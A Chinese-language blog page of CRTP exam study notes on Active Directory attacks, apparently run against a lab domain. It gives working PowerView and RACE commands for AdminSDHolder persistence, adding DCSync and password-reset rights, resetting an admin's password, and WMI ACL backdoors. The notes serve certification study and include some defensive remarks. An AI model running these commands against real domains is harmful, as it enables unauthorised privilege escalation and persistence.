class="toc-number">10.9.2.6.</span> <span class="toc-text">4. 利用 S4U2Self 伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-RBCD"><span class="toc-number">10.9.3.</span> <span class="toc-text">3.基于资源的约束委派 RBCD</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">10.9.3.1.</span> <span class="toc-text">1.利用点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E9%85%8D%E7%BD%AE-msDS-AllowedToActOnBehalfOfOtherIdentity-%E5%AD%97%E6%AE%B5"><span class="toc-number">10.9.3.2.</span> <span class="toc-text">2.配置 msDS-AllowedToActOnBehalfOfOtherIdentity 字段</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E8%B7%A8%E5%9F%9F-Across-Trusts"><span class="toc-number">10.10.</span> <span class="toc-text">10.跨域 Across Trusts</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-SID-history"><span class="toc-number">10.10.1.</span> <span class="toc-text">1.SID history</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%8F%90%E5%8F%96trust-key"><span class="toc-number">10.10.1.1.</span> <span class="toc-text">1.提取trust key</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E7%A1%AE%E5%AE%9A%E5%9F%9F%E4%BF%A1%E4%BB%BB%E8%B4%A6%E5%8F%B7"><span class="toc-number">10.10.1.1.1.</span> <span class="toc-text">1.确定域信任账号</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E4%BF%A1%E4%BB%BB%E5%AF%86%E9%92%A5%E4%BC%AA%E9%80%A0%E8%B7%A8%E5%9F%9FTGT"><span class="toc-number">10.10.1.2.</span> <span class="toc-text">2.利用信任密钥伪造跨域TGT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E5%BD%93%E5%89%8D%E5%9F%9Fkrbtgt-key-%E4%BC%AA%E9%80%A0TGT%E5%B9%B6%E6%B3%A8%E5%85%A5-sid-history%EF%BC%88%E7%AD%89%E5%90%8C%E6%9E%84%E9%80%A0%E9%87%91%E7%A5%A8%E6%97%B6%E5%80%99%E9%87%8C%E9%9D%A2%E5%8A%A0%E4%B8%AAsid-history%E5%B1%9E%E6%80%A7%EF%BC%89"><span class="toc-number">10.10.1.3.</span> <span class="toc-text">3.利用当前域krbtgt key 伪造TGT并注入 sid history（等同构造金票时候里面加个sid history属性）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%A3%80%E6%B5%8B%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-number">10.10.1.4.</span> <span class="toc-text">4.检测点绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%92%BB%E7%9F%B3%E7%A5%A8"><span class="toc-number">10.10.1.4.1.</span> <span class="toc-text">钻石票</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11%EF%BC%8C%E8%B7%A8%E5%A4%96%E9%83%A8%E4%BF%A1%E4%BB%BB%EF%BC%88%E6%9E%97%EF%BC%89%E5%9F%9F-Across-External-Trust"><span class="toc-number">10.11.</span> <span class="toc-text">11，跨外部信任（林）域 Across External Trust</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%AF%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">10.11.1.</span> <span class="toc-text">1.可利用点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9E%9A%E4%B8%BE%E8%B5%84%E6%BA%90%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.11.2.</span> <span class="toc-text">2.枚举资源服务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-ADCS"><span class="toc-number">11.</span> <span class="toc-text">10 ADCS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B5%81%E7%A8%8B"><span class="toc-number">11.1.</span> <span class="toc-text">1.流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">11.2.</span> <span class="toc-text">2.利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E8%AF%81%E4%B9%A6%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">11.3.</span> <span class="toc-text">2.1 证书的权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BEADCS"><span class="toc-number">11.4.</span> <span class="toc-text">3.枚举ADCS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">11.5.</span> <span class="toc-text">4.利用示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-SQL-server-Trust-Abuse"><span class="toc-number">12.</span> <span class="toc-text">11.SQL server Trust Abuse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AD%98%E5%9C%A8%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">12.1.</span> <span class="toc-text">1.存在利用点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-MDE"><span class="toc-number">13.</span> <span class="toc-text">12.MDE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#minidump"><span class="toc-number">13.1.</span> <span class="toc-text">minidump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BC%A0%E8%BE%93%E8%90%BD%E5%9C%B0"><span class="toc-number">13.2.</span> <span class="toc-text">工具传输落地</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E7%A0%B4%E6%A3%80%E6%B5%8B%E9%93%BE"><span class="toc-number">13.3.</span> <span class="toc-text">打破检测链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASR%E7%BB%95%E8%BF%87"><span class="toc-number">13.4.</span> <span class="toc-text">ASR绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E6%96%B0%E5%81%9A%E4%B8%80%E9%81%8D11-sqlserver%EF%BC%8C%E9%87%87%E7%94%A8%E5%9F%BA%E4%BA%8Eopsec%E7%BB%95%E8%BF%87mde%E7%9A%84%E5%81%9A%E6%B3%95"><span class="toc-number">13.5.</span> <span class="toc-text">重新做一遍11.sqlserver，采用基于opsec绕过mde的做法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number"></span> <span class="toc-text">13.检测与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E5%B9%B6%E9%99%90%E5%88%B6%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">0.1.</span> <span class="toc-text">保护并限制域管理员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Protected-Users-Group"><span class="toc-number">0.2.</span> <span class="toc-text">Protected Users Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privileged-Administrative-Workstations-PAWs"><span class="toc-number">0.3.</span> <span class="toc-text">Privileged Administrative Workstations (PAWs)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAPS-Local-Administrator-Password-solution"><span class="toc-number">0.4.</span> <span class="toc-text">LAPS (Local Administrator Password solution)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time-Bound-Administration-%E2%80%94%E2%80%94-JIT"><span class="toc-number">0.5.</span> <span class="toc-text">Time Bound Administration —— JIT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Time-Bound-Administration-JEA"><span class="toc-number">1.</span> <span class="toc-text">Time Bound Administration - JEA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Detection-and-Defense-ESAE"><span class="toc-number">2.</span> <span class="toc-text">Detection and Defense - ESAE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privileged-Access-Strategy"><span class="toc-number">3.</span> <span class="toc-text">Privileged Access Strategy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enterprise-Access-Mode-%E4%BC%81%E4%B8%9A%E8%AE%BF%E9%97%AE%E6%A8%A1%E5%9E%8B"><span class="toc-number">4.</span> <span class="toc-text">Enterprise Access Mode 企业访问模型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AD%E6%8D%AE%E4%BF%9D%E6%8A%A4"><span class="toc-number">5.</span> <span class="toc-text">凭据保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E4%BF%9D%E6%8A%A4-WDAC"><span class="toc-number">6.</span> <span class="toc-text">设备保护(WDAC)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E6%94%BB%E5%87%BB%E5%92%8C%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%91%E7%8E%B0"><span class="toc-number">7.</span> <span class="toc-text">票据攻击和重放攻击的检测与发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberasting-%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">8.</span> <span class="toc-text">kerberasting 的检测与防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%AF%B1%E9%A5%B5"><span class="toc-number">9.</span> <span class="toc-text">下诱饵</span></a></li></ol>
</div>
<script>
    function toggleTOC() {
        const tocContainer = document.getElementById('tocContainer');
        tocContainer.style.display = tocContainer.style.display === 'none' ? 'block' : 'none';
        const toggleIcon = document.querySelector('.toc-toggle-icon i');
        toggleIcon.classList.toggle('fa-angle-down');
        toggleIcon.classList.toggle('fa-angle-up');
    }
</script>
<style>
    .toc-toggle {
        position: relative;
        display: inline-block;
        padding: 2% 2% 2%;
        border: none;
        border-radius: 100%;
        background-color: var(--link);
        cursor: pointer;
        transition: all 0.1s ease;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        /* position: absolute; */
        top: 0;
        right: 0;
        z-index: 10;
    }

    .toc-toggle:hover {
        background-color: var(--selection-bg);
        transform: scale(1.1);
    }

    .toc-toggle-icon {
        display: inline-block;
        vertical-align: middle;
    }

    .toc-toggle-icon i {
        display: inline-block;
        border-radius: 50%; /* Ensures the icon itself is a perfect circle */
    }

    /* #tocContainer {
        display: block;
        margin-top: 10px;
    } */
    #tocContainer {
    position: relative;
    padding-top: 10px; /* 留出按钮位置 */
}
</style>


    </div>
    
    <div id="content-body">
       


<article id="post-crtp-study-note" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cmbjpszsk00c2q8ky9zxbg1if">
        <img src="/wpimages/2025/crtp-study-note/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        crtp-study-note
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-12-20T11:40:41.000Z" itemprop="datePublished">2024-12-20</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
    Uncategorized 
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            57k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/crtp/" rel="tag">crtp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/" rel="tag">note</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="01-DACL"><a href="#01-DACL" class="headerlink" title="01 DACL"></a>01 DACL</h2><p>acl分为两种类型，<code>DACL</code> 和 <code>SACL</code></p>
<p>DACL</p>
<ul>
<li>控制访问权限</li>
<li>ACE包含（拒绝访问&#x2F;允许）</li>
<li>直接决定权限</li>
</ul>
<p>SACL</p>
<ul>
<li>日志&#x2F;审计记录</li>
<li>行为记录</li>
<li>失败&#x2F;成功的行为记录</li>
</ul>
<h3 id="1-用户多个权限场景的DACL匹配"><a href="#1-用户多个权限场景的DACL匹配" class="headerlink" title="1.用户多个权限场景的DACL匹配"></a>1.用户多个权限场景的DACL匹配</h3><p>以下为例，当有两个 <code>用户A</code> <code>用户B</code> </p>
<table>
<thead>
<tr>
<th>A用户</th>
<th>B用户</th>
</tr>
</thead>
<tbody><tr>
<td>Andrew</td>
<td>Jane</td>
</tr>
<tr>
<td>GROUP-A</td>
<td>GROUP-A</td>
</tr>
<tr>
<td>GROUP-B</td>
<td></td>
</tr>
<tr>
<td>GROUP-C</td>
<td></td>
</tr>
</tbody></table>
<p>他们都要访问一个 <code>对象</code></p>
<p>而这个对象 <code>DACL</code> 中的权限如下</p>
<p><code>Object</code></p>
<table>
<thead>
<tr>
<th>ACE1</th>
<th>ACE2</th>
<th>ACE3</th>
</tr>
</thead>
<tbody><tr>
<td>Access denied</td>
<td>Access allowed</td>
<td>Access allowed</td>
</tr>
<tr>
<td>Andrew</td>
<td>GROUP-A</td>
<td>Everyone</td>
</tr>
<tr>
<td>Read,Write,execute</td>
<td>Write</td>
<td>Read,execute</td>
</tr>
</tbody></table>
<p>因为 <code>拒绝</code> ACL优先级更高</p>
<p>因此 <code>A用户</code> 试图执行、写入、查看 <code>Object</code> 将会禁止访问 <code>Access denied</code></p>
<p>而 <code>B用户</code> 将拥有，<code>ACE2</code> <code>GROUP-A</code>的 <code>write</code> 权限， <code>ACE3</code> <code>Everyone</code>的<code>Read</code>、<code>execute</code> 权限。</p>
<h3 id="2-ACL权限利用"><a href="#2-ACL权限利用" class="headerlink" title="2.ACL权限利用"></a>2.ACL权限利用</h3><p>当对 <code>域管理员组</code> 有 <code>控制</code> 权限时，最好的做法不是给 <code>域管理员组</code> 添加一个用户，而是给一个账户添加对 <code>域管理员组</code> 的 <code>完全控制</code> 权限 ，但同时需要注意，每隔一小时都会有一个 <code>SD持有人</code> 的特殊容器会覆盖掉域内 <code>受保护</code> 的 <code>高价值账户或组</code> 的 <code>ACL</code></p>
<h3 id="3-枚举收集域内ACL"><a href="#3-枚举收集域内ACL" class="headerlink" title="3.枚举收集域内ACL"></a>3.枚举收集域内ACL</h3><p>枚举域内对于 <code>student1</code> 账户的权限</p>
<p>powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-domainObjectACL -SamAccountName student1 -ResolveGUIDS</span><br></pre></td></tr></table></figure>

<p>基于ldap筛选，枚举域内针对于 <code>domain admin</code> <code>CN</code> 的 <code>ACL</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainObjectACL</span> <span class="literal">-SearchBase</span> <span class="string">&quot;ldap://CN=domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local&quot;</span> <span class="literal">-ResolveGUIDs</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&#x27;ad:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span>).Access</span><br></pre></td></tr></table></figure>

<p>列出相对有价值的权限</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-InterestingDomainAcl</span> <span class="literal">-ResolveGUIDs</span></span><br></pre></td></tr></table></figure>

<p>获取与指定路径相关的ACL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-PathAcl -Path &#x27;\\dcorp-dc.dollarcorp.moneycorp.local\&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="4-AdminSDHolder"><a href="#4-AdminSDHolder" class="headerlink" title="4.AdminSDHolder"></a>4.AdminSDHolder</h3><p>安全描述符持有者是一个容器，他包含一个ACL列表，会有一个进程每过一小时读取这个acl列表，并将这个ACL其覆盖掉ACL每个受保护对象（组&#x2F;用户）。</p>
<p>因此对受保护组或成员的acl做出的任何修改都将会在一小时后被 <code>AdminSDHolder</code> 的ACL重置。</p>
<h4 id="01-利用AdminSD"><a href="#01-利用AdminSD" class="headerlink" title="01.利用AdminSD"></a>01.利用AdminSD</h4><p>只需要对 <code>AdminSDHolder</code> 添加当前用户的 <code>完全控制</code> 权限，之后adminSD的同步时候便会将当前用户的 <code>完全控制</code> 权限会自动同步应用到所有被保护的组中。</p>
<p>对 <code>AdminSDHolder</code> 操作的任何acl，都会同步至受保护的对象的 <code>ACL</code>。</p>
<p>添加之后，即便从域管组中即便删除了当前用户的权限，每次同步acl都会重新覆盖掉acl。</p>
<p>做法有两种：</p>
<p>1.powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">add-domainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&#x27;CN=AdminSDHolder,CN=System,DC=dollarcorp,dc=moneycorp,dc=local&#x27;</span> <span class="literal">-PrincipalIdentity</span> Student1 <span class="literal">-Right</span> All <span class="literal">-principaldomain</span> dollarcorp.moneycorp.local <span class="literal">-Targetdomain</span> dollarcorp.moneycorp.local <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>2.RACE</p>
<p>需要DA权限</p>
<p><a target="_blank" rel="noopener" href="https://github.com/samratashok/RACE">https://github.com/samratashok/RACE</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DCPermissions</span> <span class="literal">-Method</span> AdminSDHolder <span class="literal">-SAMAccountNAME</span> student1 <span class="literal">-Right</span> GenricAll <span class="literal">-DistinguishName</span> <span class="string">&#x27;CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<h4 id="02-加载脚本手动触发adminSD同步"><a href="#02-加载脚本手动触发adminSD同步" class="headerlink" title="02.加载脚本手动触发adminSD同步"></a>02.加载脚本手动触发adminSD同步</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sess</span> = <span class="built_in">New-PSSession</span> <span class="literal">-ConputerName</span> dcorp<span class="literal">-dc</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Session</span> <span class="variable">$sess</span> <span class="literal">-FilePath</span> <span class="string">&quot;C:\tools\Invoke-SDPropagator.ps1&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Session</span> <span class="variable">$sess</span> <span class="literal">-scriptblock</span> &#123;<span class="built_in">Invoke-SDPropagator</span> <span class="literal">-showProgress</span> <span class="literal">-Verbose</span> <span class="literal">-timeoutMinutes</span> <span class="number">1</span>&#125; </span><br></pre></td></tr></table></figure>

<p>2008的话用这个</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-SDPropagator</span> <span class="literal">-taskname</span> FixUpInheritancetimeoutMinutes <span class="number">1</span><span class="literal">-showProgress</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<h4 id="03-如何防范"><a href="#03-如何防范" class="headerlink" title="03.如何防范"></a>03.如何防范</h4><p>除了保护好域管理员之外，还应当对adminSDHolder 开启日志审计。</p>
<h3 id="5-权限修改、添加等（命令样例）"><a href="#5-权限修改、添加等（命令样例）" class="headerlink" title="5.权限修改、添加等（命令样例）"></a>5.权限修改、添加等（命令样例）</h3><p>添加对 <code>AdminSDHolder</code> 的 <code>ResetPassword</code>权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">add-domainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&#x27;CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span> <span class="literal">-printcipalIdentity</span> student1 <span class="literal">-Rights</span> ResetPassword <span class="literal">-Principaldomain</span> dollarcorp.moneycorp.local <span class="literal">-Targetdomain</span> dollarcorp.moneycorp.local <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>添加对 <code>AdminSDHolder</code> 的 <code>writeMembers</code>权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">add-domainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&#x27;CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span> <span class="literal">-printcipalIdentity</span> student1 <span class="literal">-Rights</span> writeMembers <span class="literal">-Principaldomain</span> dollarcorp.moneycorp.local <span class="literal">-Targetdomain</span> dollarcorp.moneycorp.local <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>重置testda用户密码</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-domainUserPassword</span> <span class="literal">-Identity</span> testda <span class="literal">-AccountPassword</span> (<span class="built_in">ConvertTo-Securestring</span> <span class="string">&quot;Password@123&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>


<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADAccountPassword</span> <span class="literal">-Identity</span> testda <span class="literal">-NewPassword</span> (<span class="built_in">ConvertTo-Securestring</span> <span class="string">&quot;Password@123&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>检查student1对domain admins的权限</p>
<p>powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObjectAcl -Identity &#x27;Domain Admins&#x27; -ResolveGUIDs |ForEach-Object &#123;$_ | Add-Member NoteProperty &#x27;IdentityName&#x27; $(Convert-SidToName $_.securityIdentifier);$_ &#125; | ?&#123; $_.IdentityName -match &quot;student1&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>AD moduel</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-Acl</span> <span class="literal">-Path</span> <span class="string">&#x27;AD:\CN=domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span>).Access | ?&#123;<span class="variable">$_</span>.IdentityReference <span class="operator">-match</span> <span class="string">&quot;student1&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><strong>添加对域的DCSync权限，这里涉及到两个权限 <code>Replicating Diretory changes</code> 和 <code>Replicating Diretory changes ALL</code></strong></p>
<p>powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-domainobjectACL -TargetIdentity &#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27; -principalIdentity student1 -Rights DSCync -Principaldomain dollarcorp.moneycorp.local -Targetdomain dollarcorp.moneycorp.local -Verbose</span><br></pre></td></tr></table></figure>

<p>RACE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set-ADACL  -SamAccountName Student1 -DistinguishedName &#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27; -GUIDRight Dcsync -Verbose</span><br></pre></td></tr></table></figure>

<h3 id="6-基于ACL利用的访问持久化"><a href="#6-基于ACL利用的访问持久化" class="headerlink" title="6.基于ACL利用的访问持久化"></a>6.基于ACL利用的访问持久化</h3><p>在有管理访问权限的机器上，通过修改某些 <code>acl</code> 满足以无需管理权限便允许通过WMI或远程注册表访问机器，通常这些访问方式需要有机器的管理权限才可使用。</p>
<p>这些ACL通常是SDDL编写（安全描述符定义语言）</p>
<p>安全描述符（SDDL）使用ACE形式来表示 DACL 和 SACL 如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid</span><br></pre></td></tr></table></figure>

<p>比如 <code>administrator</code> 在WMI命名空间的 <code>ACE</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A;CI;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-32-544</span><br></pre></td></tr></table></figure>

<p>如下</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>A</strong></td>
<td>Allow</td>
<td>允许访问</td>
</tr>
<tr>
<td><strong>CI</strong></td>
<td>Container Inherit</td>
<td>可被子对象继承</td>
</tr>
<tr>
<td><strong>CCDCLCSWRPWPDTLOSDRCWDWO</strong></td>
<td>权限</td>
<td>多个权限位</td>
</tr>
<tr>
<td><strong>空</strong></td>
<td>对象 GUID</td>
<td>不限定</td>
</tr>
<tr>
<td><strong>空</strong></td>
<td>继承 GUID</td>
<td>不限定</td>
</tr>
<tr>
<td><strong>S-1-5-32-544</strong></td>
<td>SID</td>
<td>本地组：<strong>Administrators</strong></td>
</tr>
</tbody></table>
<p>要利用这个，可以用当前所控制账户的SID 拿管理员对应的这条ACE搞过来，并指定后面的SID到目标用户，便可以得到相同权限。</p>
<h4 id="WMI的ACL修改"><a href="#WMI的ACL修改" class="headerlink" title="WMI的ACL修改"></a>WMI的ACL修改</h4><p>当使用WMI的时候有两个地方会检查权限，一个是DCOM，一个是wmi命名空间（检查是否有权限连接到DCOM端点）</p>
<p>这里直接用RACE，对WMI进行操作，注意修改这些部分需要admin权限。</p>
<p>在本地执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotewMI</span> <span class="literal">-SamAccountName</span> student1 <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>在远程主机执行（使用当前用户凭据）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemoteWMI</span> <span class="literal">-SamAccountName</span> student1 <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>使用其他用户凭据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemoteWMI</span>  <span class="literal">-SamAccountName</span> student1 <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-credential</span> Administrator <span class="literal">-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>远程删除对应权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotewMI</span> <span class="literal">-SamAccountName</span> student1  <span class="literal">-ComputerName</span> dcorp<span class="literal">-dc-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Remove</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>有权限后可以验证一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gwmi -class win32_operatingsystem -ComputerName dcorp-dc</span><br></pre></td></tr></table></figure>

